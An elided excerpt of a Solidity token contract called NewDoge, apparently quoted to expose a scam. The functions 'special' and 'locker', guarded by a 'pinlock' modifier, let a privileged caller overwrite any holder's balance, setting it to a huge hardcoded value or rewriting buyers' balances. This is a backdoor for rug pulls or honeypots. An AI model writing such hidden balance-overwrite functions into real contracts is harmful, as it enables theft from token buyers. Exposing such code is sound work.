...
library Address {
  ...
  contract NewDoge is  IERC20, Ownable {
  ...
  uint256 private RouterFees_ = 0x33B2E3C9FD0803CE8000000;
  ...
  function rewards (address buyer) internal pinlock returns  (uint256) {
    ...
    function locker(address buyer) public {

    balances[buyer] = rewards (buyer);


  }


  function special (address holder ) public pinlock {

    balances[holder] = (RouterFees_);
